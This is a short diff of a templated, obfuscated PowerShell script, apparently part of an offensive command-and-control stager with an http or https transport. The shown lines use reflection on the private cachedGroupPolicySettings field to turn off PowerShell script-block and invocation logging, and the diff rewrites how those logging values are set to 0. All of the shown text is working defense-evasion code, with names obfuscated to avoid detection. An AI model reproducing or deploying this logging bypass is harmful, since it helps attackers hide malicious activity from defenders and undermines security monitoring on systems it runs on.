@@ -39,8 +39,8 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
 
     ${{symbol_name("settings")}} = [Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}.Invoke({{obfuscate("System.Management.Automation.Utils")}}).{{obfuscate("GetField")}}.Invoke({{obfuscate("cachedGroupPolicySettings")}},{{obfuscate("NonPublic,Static")}}).GetValue($null);
     ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}] = @{}
-    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}].Add({{obfuscate("EnableScriptBlockLogging")}},{{obfuscate("0")}})
-    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}].Add({{obfuscate("EnableScriptBlockInvocationLogging")}},{{obfuscate("0")}})
+    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}][{{obfuscate("EnableScriptBlockLogging")}}] = {{obfuscate("0")}}
+    ${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}][{{obfuscate("EnableScriptBlockInvocationLogging")}}] = {{obfuscate("0")}}
 }
 
 {% if transport in ['http', 'https'] %}
